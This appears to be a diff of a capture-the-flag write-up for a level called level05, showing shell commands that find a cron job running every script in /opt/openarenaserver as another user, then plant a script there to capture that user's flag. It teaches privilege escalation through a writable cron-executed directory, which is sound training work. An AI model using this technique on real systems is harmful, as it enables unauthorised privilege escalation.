@@ -1,12 +1,16 @@
-$> find / -name "level05" 2>/dev/null
-/var/mail/level05
-/rofs/var/mail/level05
+(login into level05)
+You have new mail.
+	==> /var/mail/level05
+
 $> cat /var/mail/level05
 */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
-$> # Cron at every 2nd minute.
+
+# Cron at every 2 minutes.
+
 $> find / -user flag05 2>/dev/null
 /usr/sbin/openarenaserver
 /rofs/usr/sbin/openarenaserver
+
 $> cat /usr/sbin/openarenaserver
 #!/bin/sh
 
@@ -14,9 +18,12 @@ for i in /opt/openarenaserver/* ; do
 	(ulimit -t 5; bash -x "$i")
 	rm -f "$i"
 done
-$> # We create a executable which will be executed by the cron job
-$> cat /opt/openarenaserver/mybin
-#!/bin/sh
-getflag > /dev/shm/myflag
-$> chmod +x /opt/openarenaserver/mybin
-$> cat /dev/shm/myflag
+
+# We create an executable script which will get executed by the cron job
+
+$> cat /opt/openarenaserver/exploit
+/bin/getflag > /dev/shm/flag05
+
+$> chmod +x /opt/openarenaserver/exploit
+
+$> cat /dev/shm/flag05
